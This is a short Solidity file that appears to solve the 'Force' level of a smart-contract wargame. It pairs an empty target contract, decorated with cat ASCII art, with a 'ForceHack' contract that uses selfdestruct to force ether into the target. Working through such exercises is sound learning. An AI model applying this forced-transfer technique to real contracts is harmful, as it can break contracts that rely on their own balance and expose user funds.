pragma solidity ^0.8.0;


contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract ForceHack{

    address glb_address;

    constructor(address payable force_addr){

        glb_address = force_addr;

    }

    function giveValue() public payable {
        
        // Self Destruct will transfer eth to contract to a said balance
        selfdestruct(payable(glb_address));

    }

}